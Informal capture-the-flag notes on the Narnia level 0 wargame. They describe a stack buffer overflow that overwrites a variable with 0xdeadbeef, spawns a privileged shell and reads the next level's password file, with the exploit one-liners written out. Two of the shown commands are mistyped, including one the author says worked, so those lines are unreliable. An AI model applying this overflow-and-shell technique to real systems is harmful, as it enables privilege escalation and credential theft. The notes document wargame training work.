so we have a execuatable narnia0 along with the sourcecode narnia.c
okay that's good no need to do any reverse engineering.

execuate the program, the prompt asked for input.
okay so essentially, we need to change the input to deadbeef.

looking at the sourcecode, the variable buf has 20 bytes of memory,
but scanf() reads in 24. So can can overflow with 4 bytes.
Hmm, fitting deadbeef in 4 bytes.

oh and the memory is stored as little endian!

!!!Python3 script did not work, no idea why:
python3 -c 'print("B*20"+"\xef\xbe\xad\xbe")' | ./narnia0

changed to python2 and it worked:
python -c 'print "B"*20 + \xef\xbe\xad\be' | ./narnia0

we got deadbeef but it won't spawn a new shell??

okay so the problem is it's still reading the input from python,
so a workaround is:

(python -c 'print "B"*20 + "\xef\xbe\xad\xde"'; cat ) | ./narnia0
we then have a new shell with narnia1 privilege, now we can cat the password for the next
level.

cat /etc/narnia_pass/narnia1

Thought it was easy, not quite.
